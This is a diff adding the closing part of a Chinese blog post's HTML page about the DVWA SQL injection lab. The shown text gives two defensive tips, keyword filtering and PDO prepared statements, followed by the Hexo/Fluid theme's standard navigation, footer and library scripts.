+<li>过滤危险字符：可以使用正则表达式匹配各种 SQL 子句，例如 select,union,where 等，如果匹配到则退出程序。</li>
+<li>使用预编译语句：PDO 提供了一个数据访问抽象层，这意味着不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。使用 PDO 预编译语句应该使用占位符进行数据库的操作，而不是直接将变量拼接进去。</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" class="print-no-link">#SQL注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>dvwa-SQL-injection</div>
+      <div>http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>LYM</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年6月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/05/dvwa-SQL-injection-blind/" title="SQL-injection-blind">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SQL-injection-blind</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/04/dvwa-file-upload/" title="dvwa-file-upload">
+                        <span class="hidden-mobile">dvwa-file-upload</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      豫ICP备2022024455
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
